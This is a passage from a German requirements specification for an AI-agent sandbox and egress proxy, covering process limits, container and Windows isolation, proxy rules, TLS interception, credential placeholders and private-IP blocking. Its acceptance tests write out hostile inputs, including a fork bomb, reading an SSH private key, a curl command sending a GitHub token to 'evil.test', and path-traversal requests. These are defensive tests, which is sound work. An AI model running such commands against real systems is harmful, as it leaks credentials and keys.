- **Details:** `sandbox.limits: { memory_mb, pids, cpu_seconds, file_size_mb }`, je Feld gilt die spezifischste Ebene; `pids` ≥ 16, `memory_mb` ≥ 16. Linux: Ist ein Vorfahre der eigenen cgroup delegiert (beschreibbar, `memory` und `pids` aktiv, z. B. unter `user@<uid>.service` oder einer Unit mit `Delegate=yes`), legt der Launcher pro Sandbox eine cgroup an (`pids.max`, `memory.max`, `memory.swap.max = 0`), verschiebt den Baum hinein, meldet neue Einträge in `pids.events`/`memory.events` (`oom_kill`) als `sandbox.violation {kind: limit, target: pids|memory}` und entfernt sie am Ende (`cgroup.kill`). Mit cgroup ersetzt `pids.max` das `RLIMIT_NPROC`. Ohne Delegation: `RLIMIT_NPROC` im eigenen User-Namespace (zählt nur die Sandbox), `memory_mb` nicht durchsetzbar → Probe `resources: degraded`, Policy `degraded: [resources]` mit Hinweis; PID 1 meldet `limit {pids}`, wenn die Prozesszahl im PID-Namespace das Limit erreicht. Immer: `RLIMIT_CPU`, `RLIMIT_FSIZE`, keine Core-Dumps. macOS: `RLIMIT_NPROC` zählt alle Prozesse des Benutzers; das Limit gilt zusätzlich zu den beim Start laufenden, mit Abstand (ein Viertel, höchstens 32), weil andere Prozesse währenddessen enden können. Ein Hintergrund-Thread erfasst alle 25 ms die Nachfahren (Eltern-PID, Prozessgruppe, Startzeit gegen PID-Wiederverwendung), meldet das Erreichen des Limits (Prozesse des Benutzers gegen den gesetzten `RLIMIT_NPROC`, die Bedingung des Kernels; gezählt über die lesbaren Prozesse und zusätzlich über die Kernel-Liste der realen UID, weil `proc_pidinfo` nicht jeden Prozess des Benutzers beschreibt) und beendet beim Stoppen bzw. Fallenlassen alle erfassten Prozesse; dafür erfasst er den Baum noch einmal, bevor die Wurzel ein Signal bekommt, ob beim Stoppen (SIGKILL), beim geordneten Beenden (SIGTERM an die Prozessgruppe) oder beim Fallenlassen (sonst hinge ein per `setsid` abgelöster Prozess nach dem Tod der Wurzel unerkannt an launchd). Gemeldet wird jedes Ziel höchstens einmal pro Start; die Anbindung an Session-Events folgt mit SBX-006 (WP-49), heute über `Sandbox::with_violations`. Restrisiko macOS: per `setsid` und doppeltem `fork` zwischen zwei Erfassungen daemonisierte Prozesse bleiben in der Sandbox gefangen (Profil wird vererbt), werden aber nur best effort beendet; dokumentiert.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Eine Fork-Bombe in Stufe 2 mit `limits.pids: 256` wird begrenzt; der Host bleibt bedienbar, die Session meldet `sandbox.violation {kind: "limit"}`.
  - [ ] AC2 — Nach `session stop` existiert unter Linux kein Prozess der Session mehr (PID-NS leer); unter macOS sind alle per Nachfahren-Erfassung bekannten Prozesse beendet.
  - [ ] AC3 — `limits.memory_mb` wird unter Linux mit cgroup-Delegation durchgesetzt (OOM des Tools, nicht des Runners); ohne Delegation meldet die Probe `resources: degraded`.
- **Abhängigkeiten:** SBX-007, SBX-008

### SBX-014 — Verstoß-Reporting
- **Meilenstein:** M2 · **Priorität:** Could
- **Beschreibung:** Erkennbare Sandbox-Verstöße werden als Event `sandbox.violation {stage, kind: fs|net|syscall|limit|proxy_down, target, ts}` gemeldet und in der UI an der verursachenden Tool-Card angezeigt, damit Nutzer gezielt Grants ergänzen können („Pfad freigeben?“ → Vorschlag für Projekt-Konfiguration, nie automatisch). Quellen: Proxy-Denies (immer), macOS-Sandbox-Log (best effort), Landlock-Audit (Kernel ≥ 6.15, best effort), seccomp-EPERM nur indirekt.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Ein geblockter HTTP-Request erzeugt ein Event mit Host, Methode, Pfad (ohne Query) und der Tool-Call-ID.
  - [ ] AC2 — Der UI-Vorschlag „Regel hinzufügen“ schreibt erst nach Bestätigung in `.beton/config.yaml`.
  - [ ] AC3 — Verstoß-Events werden pro Session auf 10/s begrenzt, Überzählige als `suppressed_count` zusammengefasst.
- **Abhängigkeiten:** SBX-007, SBX-008, PRX-009

### SBX-015 — Docker/Podman-Backend
- **Meilenstein:** M5 · **Priorität:** Must
- **Beschreibung:** Stärkste plattformübergreifende Option (auch Windows/macOS via Docker Desktop, rootless Podman bevorzugt). Pro Session zwei Container aus demselben Image: `bt-<sid>-harness` (Stufe 1, mit verschlüsseltem Credential-Volume des Vendors, siehe RUN-015 in 10-runners-extensibility.md) und `bt-<sid>-tools` (Stufe 2, ohne Credential-Volume); der Exec-Broker führt Stufe-2-Kommandos per `exec` im Tools-Container aus. Workspace als Bind-Mount bzw. Volume. Abgrenzung: SBX-015 ist Owner des Isolations-Backends (`sandbox.backend: docker|podman`) und der Container-Härtung; RUN-008 ist Owner des Docker-RunnerProviders (wo der Runner läuft) und nutzt dieselbe Härtung.
- **Details:** Image: Runner-Image (RUN-014), lokal gebaut bzw. per Datei geladen oder aus der Registry; ein fehlendes Image wird nur nach Konfiguration gezogen, sonst `sandbox_unavailable` mit Hinweis auf den lokalen Build (ADR-0033). Flags: `--cap-drop=ALL`, `--security-opt no-new-privileges`, Default-seccomp-Profil, `--read-only` Root-FS + tmpfs `/tmp`, `--user <uid>:<gid>`, `--pids-limit`, `--memory`, kein Docker-Socket. Netz: Linux nativ `--network none` + gemounteter Proxy-Unix-Socket + Relay im Container; Docker Desktop: `--internal`-Netz mit Relay-Sidecar, der zum Host-Proxy (Proxy-Auth-Token) weiterleitet. Masken als tmpfs- bzw. `/dev/null`-Mounts.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Die Escape-Suite besteht mit `backend: docker` und `backend: podman` (rootless) auf Linux sowie mit Docker Desktop auf macOS.
  - [ ] AC2 — Aus dem Tools-Container ist das Credential-Volume des Harness-Containers nicht erreichbar.
  - [ ] AC3 — Ohne laufenden Docker-Daemon liefert `backend: docker` `sandbox_unavailable` (kein Fallback).
  - [ ] AC4 — `docker inspect` des Tools-Containers zeigt keine Secret-Werte in Env oder Labels.
- **Abhängigkeiten:** SBX-002, PRX-008, RUN-008, RUN-015 (siehe 10-runners-extensibility.md)

### SBX-016 — Windows-Beta-Backend
- **Meilenstein:** M5 · **Priorität:** Must
- **Beschreibung:** Best-effort-Isolation über dem Omnigent-Niveau: Stufe 1 läuft mit Restricted Token (Admin-SIDs deny-only, Privilegien entfernt) in einem Job Object (`KILL_ON_JOB_CLOSE`, Prozess-/Speicherlimits, UI-Restriktionen); Stufe 2 zusätzlich in einem **AppContainer** ohne Capabilities, dem der Runner per ACE gezielt Zugriff auf Workspace und Scratch gewährt (beim Session-Ende entfernt). Die Beta wird in UI und Doku als solche gekennzeichnet.
- **Details:** **Nicht isoliert** (dokumentiert, in `probe` als `degraded`): Netzwerk in Stufe 1 (kein Proxy-Zwang); Netz-Egress über Proxy in Stufe 2 (AppContainer kann Loopback nicht ohne Admin-Ausnahme erreichen → Stufe 2 hat entweder **gar kein Netz** oder, mit `windows.allow_unenforced_network: true`, unkontrolliertes Netz mit nur gesetzten Proxy-Variablen); Lesezugriff von Stufe 1 auf das Benutzerprofil; Registry-Lesezugriffe; Named Pipes/ALPC anderer Prozesse; Dotfile-Masken innerhalb freigegebener Wurzeln. Empfehlung für volle Isolation: Docker-Backend oder WSL2.
- **Akzeptanzkriterien:**
  - [ ] AC1 — In Stufe 2 scheitern Lesen von `%USERPROFILE%\.ssh\id_ed25519` und Schreiben nach `C:\Windows\Temp\x` sowie außerhalb des Workspace.
  - [ ] AC2 — Mit `allow_network: true` und ohne `allow_unenforced_network` startet die Session nicht (`sandbox_unavailable`, `missing: ["net"]`).
  - [ ] AC3 — Schließen des Job-Handles (Runner-Absturz) beendet den gesamten Prozessbaum.
  - [ ] AC4 — Nach Session-Ende sind die hinzugefügten ACEs am Workspace wieder entfernt.
- **Abhängigkeiten:** SBX-001, SBX-002, SBX-011
- **Referenz:** Omnigent nur Job Object ohne FS-/Netz-Isolation (3.5.3)

### SBX-017 — PTY-/Native-TUI-Modus unter Sandbox
- **Meilenstein:** M3 · **Priorität:** Must
- **Beschreibung:** Auch im PTY-Modus (Original-Vendor-TUI, HAR-012 in 01-harnesses.md) läuft der Harness in Stufe 1; das PTY wird von `beton-pty` (Stufe 0) gehalten, der Kindprozess am PTY-Slave startet über `SandboxProvider::spawn`. Shell-Kommandos des Vendor-TUIs gehen über `bt-exec` in Stufe 2. Workspace-Terminals einer Session (SES-019, siehe 07-sessions-collaboration.md) laufen in Stufe 2.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Im PTY-Modus von Claude Code scheitert `!cat ~/.ssh/id_ed25519` bzw. das Bash-Tool mit demselben Befehl.
  - [ ] AC2 — Ein User-Terminal der Session hat dieselben Netz- und FS-Grenzen wie Stufe 2 (Escape-Teilmenge im PTY-Test).
  - [ ] AC3 — Fenstergrößenänderungen und Ctrl+C erreichen den Prozess in der Sandbox.
- **Abhängigkeiten:** SBX-002, HAR-012 (siehe 01-harnesses.md), TUI-002 (siehe 08-clients.md), SES-019 (siehe 07-sessions-collaboration.md)

### PRX-001 — Proxy-Kern & Instanzmodell
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** `beton-proxy` ist ein HTTP/1.1-Forward-Proxy mit CONNECT auf Basis von tokio/hyper/rustls, der im Runner (Stufe 0) läuft. Jede Session-Stufe erhält eine eigene Proxy-Identität (Regeln, Bindings, Auth-Token); Requests ohne gültige `Proxy-Authorization` werden mit 407 abgewiesen. Endpunkte: Unix-Socket (Linux/Docker, über Relay) bzw. `127.0.0.1:<zufälliger Port>` (macOS, Windows).
- **Details:** Proxy-URL in der Sandbox: `http://bt:<token>@127.0.0.1:<port>`; Token 256 bit, pro Stufe und Session. Fehlerantworten tragen Header `X-Beton-Egress: denied|error` und JSON-Body `{error, reason, rule_hint?}`; `error` ist einer von `invalid_request` (400), `egress_denied`, `private_destination` (403), `proxy_auth_required` (407), `misdirected_request` (421), `upstream_tls_error`, `upstream_connect_error`, `dns_error`, `upstream_error` (502) und `upstream_timeout` (504); `denied` steht bei 4xx, `error` bei 5xx. Timeouts: Connect 10 s (inkl. DNS und Upstream-TLS), Idle 120 s. Die Latenzmessung aus AC3 läuft im Release-Build als eigener Schritt im Linux-Testjob. Der Proxy läuft im Runner der Session; der Daemon lädt die beton-CA beim Session-Start über die Proxy-Capability (`CaStore::load_or_create`, auditiert) und übergibt sie nur über stdin (dritte Zeile, nie Env oder argv). Ohne CA, bei gesperrtem Store, kaputter oder abgelaufener CA startet keine Session mit Netz (`sandbox_unavailable`). Je Stufe eine Instanz mit eigenem Token und eigenen Regeln: Stufe 1 `harness.egress_extra` plus Passthrough der Vendor-Hosts, Stufe 2 `egress_rules`, `egress_allow_private` und ggf. `egress_passthrough`; die Instanzen enden mit dem Runner. Jede Instanz lauscht auf `127.0.0.1:<zufälliger Port>`; unter Linux erreicht der Relay sie über den Connector im Host-Netz (SBX-008). Ein Unix-Socket-Endpunkt ist erst für Docker/Podman nötig (SBX-015, M5) *(Entscheidung zu #191)*.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Ein Request ohne bzw. mit fremdem Proxy-Token erhält 407 und wird nicht weitergeleitet.
  - [ ] AC2 — Zwei parallele Sessions mit unterschiedlichen Regeln beeinflussen sich nicht (Request erlaubt in A, verboten in B).
  - [ ] AC3 — Lasttest: 200 parallele HTTPS-Verbindungen einer Session funktionieren ohne Fehler; p99-Zusatzlatenz pro Request < 20 ms lokal (ohne TLS-Handshake-Erstkosten).
- **Abhängigkeiten:** SBX-001
- **Referenz:** ADR-0007; Omnigent `EgressProxy` (Python-asyncio)

### PRX-002 — beton-CA pro Installation & TLS-MITM
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Beim ersten Start wird eine Root-CA (ECDSA P-256, Gültigkeit 2 Jahre, CN `beton egress CA <installation-id>`) erzeugt; der private Schlüssel liegt im Secret-Store (SEC-001, siehe 05-security-identity.md), nie als Klartextdatei. Für jeden erlaubten Host erzeugt der Proxy on-the-fly ein Leaf-Zertifikat (SAN = Host, 24 h, LRU-Cache); alle Leafs einer Proxy-Instanz teilen einen Schlüssel, sodass dessen SPKI-Hash für Chromium-Pinning stabil ist (PRX-011). Upstream-TLS wird strikt validiert (webpki + System-Roots + `proxy.extra_ca_files`).
- **Details:** Die CA wird nie in System-Trust-Stores installiert. Sandbox erhält ein kombiniertes Bundle (System-Roots + beton-CA) via Env (PRX-008). `beton proxy ca rotate` (`POST /v1/proxy/ca/rotate`) erzeugt eine neue CA; laufende Sessions behalten ihre bis zum Neustart. Upstream-Zertifikatsfehler → 502 `upstream_tls_error`, kein Override in Stufe 2. Die CA liegt unter `secret://org/beton/egress-ca` (JSON mit Zertifikat und PKCS#8-Schlüssel, keine PEM-Datei) und wird nur über `ProxyCap` gelesen (SEC-001); Anlage und Rotation stehen mit Fingerabdruck als `proxy.ca_created` bzw. `proxy.ca_rotated` im Audit-Log. Installations-ID ist die Node-ID. Gesperrter Store, unlesbare (`proxy_ca_corrupt`) oder abgelaufene CA (`proxy_ca_expired`) → kein Proxy, keine Session mit Netz. Eine fehlende oder leere Datei in `proxy.extra_ca_files` ist ein Konfigurationsfehler.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `curl https://example.com` in der Sandbox (mit Regel) validiert gegen die beton-CA; außerhalb der Sandbox ist die beton-CA in keinem System-Trust-Store zu finden.
  - [ ] AC2 — Ein Upstream mit selbstsigniertem bzw. abgelaufenem Zertifikat (Test-Server) führt zu 502, der Client sieht keine Verbindung zum Upstream.
  - [ ] AC3 — Der CA-Schlüssel ist nicht im Dateisystem unter `~/.beton` im Klartext auffindbar (Test durchsucht nach PEM-Key-Markern).
  - [ ] AC4 — Nach `beton proxy ca rotate` nutzen neue Sessions die neue CA; das Audit-Log enthält einen Eintrag.
- **Abhängigkeiten:** PRX-001, SEC-001, SEC-012 (siehe 05-security-identity.md)

### PRX-003 — Regel-Syntax & Matching (Default-Deny)
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Egress-Regeln haben die Form `"METHODS host/path-glob"`. Ohne passende Allow-Regel wird jeder Request abgelehnt; Deny-Regeln (Präfix `!`) haben Vorrang vor Allow-Regeln. Gematcht wird gegen den entschlüsselten Request (Methode, Host, normalisierter Pfad); der CONNECT selbst wird vorab nur zugelassen, wenn mindestens eine Regel den Host:Port erlauben könnte.
- **Details:**
  ```
  rule      = [ "!" ] methods SP target *( SP target )
  methods   = "*" / method *( "," method )        ; GET HEAD POST PUT PATCH DELETE OPTIONS; "*" = alle sieben
  target    = [ "http://" ] host [ ":" port ] [ path-glob ]
  host      = fqdn / "*." fqdn / ip-literal      ; "*.x.com" = beliebige Subdomain, NICHT x.com selbst
  path-glob = "/" …                               ; "*" = ein Segment, "**" = beliebig tief, "?" = ein Zeichen; Default "/**"
  ```
  Schema: Default `https` (Port 443); Klartext-HTTP nur mit explizitem `http://` (Port 80). `*.x.com` gilt für Subdomains jeder Tiefe (`a.b.x.com`). Hosts, die auf eine Zahl enden, werden wie in WHATWG/`inet_aton` als IPv4 gelesen (`2130706433`, `0x7f.1` = `127.0.0.1`). `**` steht nur als ganzes Segment; `*` und `?` passen nie auf `/`. Der Upstream erhält genau den geprüften, normalisierten Pfad (plus Query). Hosts werden kleingeschrieben, IDN → Punycode, abschließender Punkt entfernt. Pfade: Percent-Decoding unreservierter Zeichen, `.`/`..` aufgelöst, `//` zusammengefasst; Pfade mit `%2F`, `%5C` oder Escape über die Wurzel → 400. Query wird ignoriert. `TRACE` und `CONNECT` innerhalb eines Tunnels werden immer abgelehnt. Regeln werden beim Laden kompiliert; ungültige Regeln sind ein Konfigurationsfehler.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Deklarative Regeltests (`tests/egress/*.yaml`: Regeln + Request → Entscheidung) decken Methoden-Listen, `*.`-Hosts, `**`/`*`/`?`, Port, `http://`, Deny-Vorrang und Normalisierung ab und laufen in CI.
  - [ ] AC2 — Regel `GET api.github.com/repos/a/**`: `GET /repos/a/x` erlaubt; `GET /repos/a/../b/x` und `GET /repos/a%2F..%2Fb` abgelehnt.
  - [ ] AC3 — `*.example.com` erlaubt `a.example.com`, nicht `example.com` und nicht `example.com.evil.test`.
  - [ ] AC4 — `http://`-Requests ohne `http://`-Regel werden abgelehnt, auch wenn eine HTTPS-Regel für den Host existiert.
  - [ ] AC5 — CONNECT zu einem Host ohne jede Regel wird mit 403 abgelehnt, bevor ein TLS-Handshake stattfindet.
- **Abhängigkeiten:** PRX-001
- **Referenz:** Omnigent `rules.py` (3.5.3)

### PRX-004 — HTTP/2, WebSocket & Protokollgrenzen
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Der Proxy bietet Clients per ALPN `h2` und `http/1.1` an und spricht upstream, was der Server unterstützt. Bei HTTP/2 wird **jeder Stream einzeln** gegen die Regeln geprüft; `:authority` muss dem CONNECT-Host entsprechen (sonst 421), damit Connection-Coalescing keine Regeln umgeht. WebSocket-Upgrades über HTTP/1.1 werden anhand des Upgrade-Requests geprüft und danach transparent weitergeleitet. gRPC (h2 mit Trailern) funktioniert.
- **Details:** Nicht unterstützt in v1 (sauber abgelehnt): Extended CONNECT (RFC 8441, `SETTINGS_ENABLE_CONNECT_PROTOCOL=0`), h2c, HTTP/3/QUIC (UDP ist ohnehin gesperrt; `Alt-Svc`-Header werden aus Antworten entfernt). Non-HTTP-TCP (SSH, Datenbanken) nur über Passthrough-Einträge `host:port` (PRX-005). Max. 100 gleichzeitige Streams pro Client-Verbindung.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Über eine h2-Verbindung zu `api.github.com` wird ein erlaubter `GET` beantwortet und ein verbotener `DELETE` auf demselben Connection mit 403 (Stream-lokal) abgelehnt, ohne die Verbindung zu schließen.
  - [ ] AC2 — Ein h2-Request mit `:authority: other.example` auf einer Verbindung zu `allowed.example` erhält 421.
  - [ ] AC3 — Ein WebSocket zu einem erlaubten Host funktioniert (Echo-Test); zu einem nicht erlaubten Host scheitert der Upgrade mit 403.
  - [ ] AC4 — Antworten enthalten keinen `Alt-Svc`-Header.
- **Abhängigkeiten:** PRX-002, PRX-003

### PRX-005 — Passthrough für Vendor-Hosts (Stufe 1)
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Damit beton Subscription-Tokens nie sieht (HAR-015, siehe 01-harnesses.md), werden die vom Adapter deklarierten Vendor-Hosts in Stufe 1 als **Passthrough** behandelt: CONNECT wird ohne TLS-Terminierung getunnelt, geprüft werden nur Host, Port, private IP (PRX-007) und dass die SNI im ClientHello dem CONNECT-Host entspricht. Weitere Stufe-1-Ziele (z. B. Remote-MCP-Server aus der Agent-Konfiguration) laufen normal über Regeln und MITM.
- **Details:** Adapter-Deklaration (verifiziert gegen claude 2.1.296 und codex-cli 0.161.0 über einen lokalen CONNECT-Mitschnitt und die Endpunkte der CLIs, *korrigiert gegenüber der früheren Annahme*): Claude `api.anthropic.com` (Modell-API), `platform.claude.com` (Erneuern des OAuth-Tokens), `claude.ai`, `mcp-proxy.anthropic.com` (claude.ai-Connectoren); nicht `console.anthropic.com` und `statsig.anthropic.com`. Telemetrie (`http-intake.logs.us5.datadoghq.com`) und Auto-Update (`downloads.claude.ai`) bleiben gesperrt, die CLI arbeitet ohne. Codex `chatgpt.com`, `ab.chatgpt.com` (ChatGPT-Login), `auth.openai.com` (Token-Erneuerung), `api.openai.com` (API-Key). Erweiterbar über `sandbox.harness.egress_passthrough`; pro Vendor-Release zu prüfen. Einträge sind exakte Hostnamen mit optionalem Port (Default 443), keine IP-Literale und keine Wildcards. Der Proxy löst selbst auf, prüft alle Adressen (PRX-007), verbindet den Upstream vor der Antwort `200` und reicht erst weiter, wenn die ersten Bytes ein vollständiges `ClientHello` mit genau der SNI des CONNECT-Hosts sind; fremde oder fehlende SNI und Nicht-TLS trennen die Verbindung, bevor ein Byte den Upstream erreicht. Geloggt werden nur Host, Port, Entscheidung und Byte-Zahlen. In Stufe 2 ist Passthrough nur über explizite Konfiguration `sandbox.egress_passthrough` möglich; der Start schreibt den Audit-Eintrag `egress.passthrough` (Session, Hosts). Credential-Injection ist auf Passthrough-Verbindungen nie aktiv.
  *Entscheidung (WP-46): `auth: api_key` (HAR-015 AC4).* Mit `auth: api_key` laufen die **Model-API-Hosts** der Vendor-CLI in dieser Session statt als Passthrough über MITM mit einer Stufe-1-Regel `* <host>/**` (Claude `api.anthropic.com`, Codex `api.openai.com`), damit der Proxy den Platzhalter der Key-Variable (`ANTHROPIC_API_KEY` bzw. `OPENAI_API_KEY`) durch den Wert ersetzen kann; das Binding (`harness:<id>`, ohne implizite Injektion) gilt nur für diese Hosts. Die übrigen Vendor-Hosts (Login, Token-Erneuerung) bleiben Passthrough; mit `auth: subscription` ändert sich nichts. Die Vendor-CLI vertraut der beton-CA über die CA-Variablen der Stufe 1 (PRX-008); ob die echten CLIs das tun, prüft die Checkliste #260.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Eine Claude-Code-Session mit Subscription funktioniert in Stufe 1; ein Proxy-Debug-Dump (`BETON_LOG=beton_proxy=trace`) zeigt für `api.anthropic.com` keine entschlüsselten Header (manuell mit der angemeldeten CLI, Checkliste im PR; automatisiert gegen einen lokalen TLS-Upstream).
  - [ ] AC2 — Ein ClientHello mit SNI `evil.test` in einem CONNECT zu `api.anthropic.com` wird getrennt.
  - [ ] AC3 — Aus Stufe 2 ist `api.anthropic.com` ohne explizite Regel nicht erreichbar.
- **Abhängigkeiten:** PRX-001, SBX-002, HAR-015 (siehe 01-harnesses.md)

### PRX-006 — Credential-Injection mit Platzhaltern
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Credentials werden als Bindings konfiguriert; die Sandbox sieht nur Platzhalter `bt_cred_<32×base32>` (160 bit, pro Session und Binding neu). Der Proxy ersetzt Platzhalter in Requests an gebundene Hosts durch den echten Wert im typgerechten Format oder injiziert ihn, wenn kein `Authorization`-Header vorhanden ist. Ein Platzhalter für einen nicht gebundenen Host führt zu 403 und einem Audit-Eintrag `credential.misuse`.
- **Details:**
  | Typ | Default-Hosts | Injektion |
  | --- | --- | --- |
  | `bearer` | (Pflichtfeld `hosts`) | `Authorization: Bearer <v>` |
  | `basic` | (Pflichtfeld `hosts`) | `Authorization: Basic base64(username:<v>)` |
  | `git_https` | (Pflichtfeld `hosts`) | Git-Credential-Helper in der Sandbox liefert Platzhalter als Passwort; Proxy ersetzt im Basic-Header |
  | `github` | `github.com`, `api.github.com`, `uploads.github.com`, `objects.githubusercontent.com` (GHE: `hosts: [ghe.example.com]`, API unter `/api/v3`) | Git: Basic `x-access-token:<v>`; API: `Authorization: Bearer <v>` (auch `token <v>` wird ersetzt) |
  | `gitlab` | `gitlab.com` (self-hosted: `hosts`) | Git: Basic `oauth2:<v>`; API: `Authorization: Bearer <v>` bzw. `PRIVATE-TOKEN: <v>` |

  Quellen (genau eine): `{secret: "secret://…"}` (Secret-Store, SEC-001 in 05-security-identity.md), `{env: NAME}` (Env des Daemons beim Session-Start), `{file: PATH}` (außerhalb aller Sandbox-Grants, keine Hardlinks, 0600 empfohlen, max. 64 KiB), `{command: [argv…], ttl: 15m}` (läuft in Stufe 0, Timeout 30 s, stdout getrimmt). Ersetzt wird in allen Request-Headern und in der URL (Pfad/Query), nie im Body; nie bei `TRACE` und nie auf Passthrough. Fehler der Quelle → 502 `credential_source_error`. `credentials[].env` setzt den Platzhalter in benannte Variablen (z. B. `GH_TOKEN`).
  *Umsetzung (M2, präzisiert):*
  - **Platzhalter:** `bt_cred_` + 32 Zeichen base32 klein (`a-z2-7`), 160 bit aus dem Zufallsgenerator des Systems, je Session und Binding neu. Erkannt wird jede syntaktisch gültige Folge (auch mitten in einem Wert); andere Schreibweisen bleiben unverändert und werden nicht ersetzt.
  - **Wo:** in jedem Request-Header (bei `Authorization: Basic` auch im dekodierten Wert), im normalisierten Pfad und in der Query; nie im Body. Erkannt wird **vor** der Regelprüfung, damit auch ein Fehlgebrauch an einen sonst gesperrten Host auditiert wird. Ersetzt wird nur über TLS (MITM) an einen Host des Bindings; ein Platzhalter an einen fremden Host oder über Klartext-HTTP ergibt 403 `credential_host_mismatch` und `credential.misuse` (Grund `host_mismatch` bzw. `insecure_transport`), ein unbekannter 403 `credential_unknown` (Grund `unknown_placeholder`). `TRACE` und `CONNECT` im Tunnel lehnt der Proxy ohnehin ab, Passthrough-Verbindungen sieht er nicht im Klartext.
  - **Hosts:** exakte Namen oder `*.domain` (beliebige Subdomain, nicht `domain`), ohne Port und ohne IP-Literal; ohne `hosts` die Default-Hosts des Typs.
  - **Format:** `Authorization: Basic` mit Platzhalter als Passwort → Benutzer nach Typ (`github` `x-access-token`, `gitlab` `oauth2`, `basic` `username`, `git_https` `username` bzw. der des Clients); `Bearer <ph>`/`token <ph>` und alle übrigen Header (`x-api-key`, `PRIVATE-TOKEN` …) werden roh ersetzt, beim Typ `basic` wird aus `<schema> <ph>` ein Basic-Header. In der URL wird der Wert prozent-kodiert. Werte mit Steuerzeichen (z. B. CR/LF) ergeben 502 statt eines eingeschleusten Headers. Requests mit eingesetztem Wert bekommen `Accept-Encoding: identity` (PRX-010).
  - **Implizit:** Ohne Platzhalter und ohne `Authorization`-Header injiziert der Proxy nur, wenn genau ein Binding der Instanz den Host bindet und das Format feststeht: `bearer` Bearer; `basic` und `git_https` (mit `username`) Basic; `github` auf `api.github.com`, `uploads.github.com` und Pfaden `/api/…` Bearer, auf `objects.githubusercontent.com` nie (signierte URLs), sonst Basic `x-access-token`; `gitlab` auf `/api/…` Bearer, sonst Basic `oauth2`. So gelingt `git clone`/`git push` ohne Credential-Helper. Interne Bindings (Vendor-Key, Direkt-API, MCP) injizieren nie implizit.
  - **Werte und Quellen:** Der Proxy im Runner holt den Wert erst für einen erlaubten Request über den Tunnel (`credential.resolve`); der Daemon beantwortet nur Bindings aus **seiner** Konfiguration für diese Session (`sandbox.credentials`, `harnesses.<id>` bzw. `providers.<name>`). `secret` liest er über die Proxy-Capability (SEC-001, Gültigkeit im Runner 60 s), `env` aus seiner Umgebung beim Start, `file` (absolut oder `~/…`, Lage außerhalb aller Lese- und Schreib-Wurzeln **beider** Stufen auch über Symlinks, ohne weitere Hardlinks, höchstens 64 KiB; geprüft beim Start der Session, Größe und Hardlinks erneut beim Lesen), `command` (argv ohne Shell, Umgebung des Daemons, Timeout 30 s, stdout ohne Leerraum am Rand, höchstens 64 KiB, `ttl` Default 15 min). Nach Ablauf holt der Runner neu; scheitert das, gibt es 502 und nie den alten Wert. Werte liegen nur im Speicher (`zeroize`), nie in Env, argv, Logs oder Events.
  - **Audit:** Vor dem Einsetzen geht jede Nutzung als `credential.used` (Binding, Session, Ziel-Host) an den Daemon; scheitert das, wird der Wert nicht eingesetzt (502). Die Nutzungen zählen im 5-min-Fenster je Binding, Session und Host (SEC-012) und werden als ein Eintrag `credential.used` mit `count`, `target_kind: credential` versiegelt.
  - **Stufe-0-Instanzen:** Für Verbindungen, die der Runner bzw. Daemon selbst aufbaut, gibt es eigene Instanzen mit genau den nötigen Regeln: der Loop des Direkt-API-Harness (HAR-011 AC2), HTTP-MCP-Server mit `${secret:…}` in `headers` (AGT-006 AC3) und `beton secrets test` (SEC-004). Ihre HTTP-Clients vertrauen nur der beton-CA.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `gh api user` und `git push` über HTTPS gelingen in Stufe 2 mit `type: github`; `env`, Prozessliste und Session-Events enthalten nur den Platzhalter.
  - [ ] AC2 — `curl -H "Authorization: Bearer $GH_TOKEN" https://evil.test/` (mit Regel für `evil.test`) erhält 403 `credential_host_mismatch`; der echte Token verlässt den Proxy nicht (Test-Upstream prüft eingehende Header).
  - [ ] AC3 — Ein unbekannter, syntaktisch gültiger Platzhalter wird mit 403 abgelehnt.
  - [ ] AC4 — `source.file` auf einen Pfad innerhalb eines Sandbox-Read-Grants wird bei der Auflösung abgelehnt.
  - [ ] AC5 — `source.command` mit `ttl: 1m` wird nach Ablauf neu ausgeführt; schlägt es fehl, erhält der Request 502 und kein veralteter Wert wird verwendet.
  - [ ] AC6 — Jede Nutzung erzeugt einen Audit-Eintrag (Binding-Name, Session, Host, Zähler pro 5-min-Fenster), nie den Wert.
- **Abhängigkeiten:** PRX-002, PRX-003, SEC-001, SEC-012 (siehe 05-security-identity.md)
- **Referenz:** ADR-0024; Omnigent Credential-Proxy (`oa_cred_*`, 3.5.3)

### PRX-007 — Private-IP- & DNS-Rebinding-Schutz
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Der Proxy löst Hostnamen selbst auf, prüft **alle** Adressen und verbindet sich ausschließlich mit einer geprüften IP (keine zweite Auflösung). Nicht-globale Ziele sind gesperrt, außer sie stehen explizit in `egress_allow_private` (als `ip:port` oder `cidr:port`).
- **Details:** Gesperrt: `0.0.0.0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16` (inkl. Metadaten), `172.16/12`, `192.0.0/24`, `192.168/16`, `198.18/15`, Multicast/Broadcast, `168.63.129.16`, `::/128`, `::1`, `fc00::/7`, `fe80::/10`, IPv4-gemappte/-kompatible IPv6-Adressen privater Ziele, NAT64 `64:ff9b::/96` mit privatem Suffix. Zusätzlich gesperrt, weil nicht global: Dokumentationsnetze (`192.0.2/24`, `198.51.100/24`, `203.0.113/24`, `2001:db8::/32`), `240/4`, `fec0::/10`, `100::/64`, lokales NAT64 `64:ff9b:1::/48`, Teredo `2001::/32`; 6to4 (`2002::/16`) und SIIT werden wie die eingebettete IPv4-Adresse geprüft. IP-Literale werden genauso geprüft (bei CONNECT und absoluter Form schon vor der Regelprüfung). Liefert der Resolver mehrere Adressen und ist eine davon gesperrt, wird das Ziel abgelehnt. DNS-Fehler = Deny (502 `dns_error`, nichts wird weitergeleitet). Redirects folgt der Proxy nie selbst (der Client folgt und jeder Folge-Request wird neu geprüft).
